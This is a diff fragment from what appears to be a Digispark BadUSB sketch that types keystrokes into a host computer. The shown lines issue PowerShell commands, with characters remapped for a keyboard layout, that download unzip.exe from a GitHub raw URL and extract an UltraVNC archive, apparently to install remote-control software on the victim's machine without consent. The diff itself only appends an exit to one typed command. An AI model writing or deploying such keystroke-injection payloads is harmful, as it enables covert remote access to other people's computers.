@@ -28,7 +28,7 @@ void loop() {
   DigiKeyboard.print("$client.DownloadFile*@https>&&raw.githubusercontent.com&zorbaproject&Guercio&master&unzip.exe@ , @unzip.exe@(");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
-  DigiKeyboard.print(".`unzip.exe .`UltraVNC.zip");
+  DigiKeyboard.print(".`unzip.exe .`UltraVNC.zip< exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(4000);
   //
